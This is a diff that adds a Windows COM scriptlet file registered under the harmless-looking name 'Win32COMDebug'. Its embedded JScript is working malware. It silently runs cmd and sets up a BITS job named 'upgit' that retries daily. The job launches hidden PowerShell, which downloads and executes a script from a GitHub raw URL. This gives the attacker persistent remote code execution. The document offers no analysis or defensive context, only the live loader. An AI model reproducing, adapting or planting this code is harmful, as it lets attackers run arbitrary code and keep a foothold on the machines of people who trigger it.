@@ -1,0 +1,19 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA0111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+      	   var r = new ActiveXObject("WScript.Shell").Run("cmd /c bitsadmin /create upgit & bitsadmin /addfile upgit %comspec%  %temp%\\cmd.exe & bitsadmin /SetNotifyCmdLine upgit %windir%\\sysWOW64\\WindowsPowerShell\\v1.0\\PowerShell.exe \"-NoP -W Hidden -c iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lucycool/1/master/gitup.data');\" & bitsadmin /SetMinRetryDelay upgit 86400 & bitsadmin /Resume upgit",0);
+	
+	]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>
